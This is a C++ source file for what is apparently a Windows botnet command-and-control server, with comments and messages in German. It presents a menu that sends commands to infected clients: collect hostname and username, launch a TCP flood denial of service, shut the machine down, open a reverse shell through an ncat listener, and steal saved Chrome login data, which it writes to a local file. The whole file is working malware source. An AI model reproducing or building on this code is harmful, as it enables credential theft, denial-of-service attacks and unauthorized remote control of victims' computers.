#define _SILENCE_ALL_CXX17_DEPRECATION_WARNINGS
#define _CRT_SECURE_NO_WARNINGS



#include <iostream>
#include <WinSock2.h>
#include <cerrno>
#define IP "192.168.178.102" 
#define PORT 4444
#include <thread>
#include <vector>

#pragma comment(lib, "ws2_32.lib")


SOCKET serverSocket, clientSocket;
sockaddr_in sockAddr;
WSADATA wsaData;
int clients;

void setup() {
	int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
	
	if (result != 0) {
		std::cerr << result << std::endl;
		return;
	}

	serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (serverSocket == INVALID_SOCKET) {
		std::cerr << "Server socket konnte nicht initialisiert werden\n";
		WSACleanup();
		return;

	}

	ZeroMemory(&sockAddr, sizeof(sockAddr));

	sockAddr.sin_family = AF_INET;
	sockAddr.sin_addr.s_addr = INADDR_ANY;
	sockAddr.sin_port = htons(PORT);
	
	result = bind(serverSocket, (sockaddr*)&sockAddr, sizeof(sockAddr));
	if (result == SOCKET_ERROR) {
		std::cout << "Der bind geht nicht" << std::endl;
		closesocket(serverSocket);
		WSACleanup();
	}


	result = listen(serverSocket, SOMAXCONN);

	if (result == SOCKET_ERROR) {
		std::cout << "Der listener geht nicht" << std::endl;
		closesocket(serverSocket);
		WSACleanup();
	}
	std::cout << "Warten auf Connection" << std::endl;
	
	

}

int Menu() {
	std::cout << "\n\nClient options:\n"
		<< "   1.- systeminfo\n"
		<< "   2.- dos\n"
		<< "   3.- Shutdown\n"
		<< "   4.- Reverse Shell\n"
		<< "   5.- BOTD\n"
		<< "   6.- Get Login Data (Chrome)";

	int opt;
	std::cin >> opt;
	std::cout << std::endl;
	std::cin.ignore();
	return opt;
}


void TCPFlood();
void shutdown();
void reverseShell();
void sysinfo();
void BOTD();
void get_login_data();
int main() {

	SetConsoleTitleA("Botnet");

	setup();

	int opt = Menu();
	switch (opt) {
	case 1:
		sysinfo();

		break;
	case 2:
		TCPFlood();
		break;
	case 3:
		shutdown();
		break;
	case 4:
		reverseShell();
		break;
	case 5:
		BOTD();
		break;
	case 6:
		get_login_data();
	default:
		std::cout << "Diese Option gibts net" << std::endl;
		break;
	}
}


void TCPFlood() {
	clientSocket = accept(serverSocket, NULL, NULL);
	char a[1024] = "dos";

	std::cout << "target IP: " << std::endl;

	int result = send(clientSocket, a, sizeof(a) - 1, 0);
	std::cout << "Option 2 (dos) sended to client" << std::endl;

	main();
}

void get_login_data() {

	clientSocket = accept(serverSocket, NULL, NULL);
	char a[1024] = "loginData";

	send(clientSocket, a, sizeof(a) - 1, 0);

	std::cout << "Option 6(login Data) sended to client" << std::endl;

	size_t datasize;
	FILE* fd = fopen("C:\\Users\\vince\\source\\repos\\LoginData.txt", "wb");
	
	char text[1024];
	datasize = recv(clientSocket, text, sizeof(text), 0);
	fwrite(&text, 1, datasize, fd);
	
	fclose(fd);

}

void shutdown() {

	clientSocket = accept(serverSocket, NULL, NULL);
	char a[1024] = "shutdown";

	int result = send(clientSocket, a, sizeof(a) - 1, 0);
	std::cout << "Option 3(shutdown) sended to client" << std::endl;

	main();
}

void sysinfo() {

	clientSocket = accept(serverSocket, NULL, NULL);
	char a[1024] = "sysinfo";
	char hostname[30];
	char username[20];
	int result = send(clientSocket, a, sizeof(a) - 1, 0);
	std::cout << "Option 1 (system info) sended to client" << std::endl;
	Sleep(5000);
	recv(clientSocket, hostname, sizeof(hostname), 0);
	recv(clientSocket, username, sizeof(username), 0);
	std::cout << "hostname: " << hostname << std::endl;
	std::cout << "username: " << username << std::endl;
	main();
}

void reverseShell() {
	clientSocket = accept(serverSocket, NULL, NULL);
	char a[1024] = "revShell";
	char input[1024];
	char response[1024];

	closesocket(serverSocket);

	int result = send(clientSocket, a, sizeof(a) - 1, 0);
	std::cout << "Option 4 (Reverse Shell) sended to client" << std::endl;
	system("ncat -lvnp 6666");

	main();
	
}
void BOTD() {
	clientSocket = accept(serverSocket, NULL, NULL);
	char a[1024] = "botd";

	int result = send(clientSocket, a, sizeof(a) - 1, 0);
	std::cout << "Opinion 5 (BOTD) sended to client" << std::endl;

	main();
}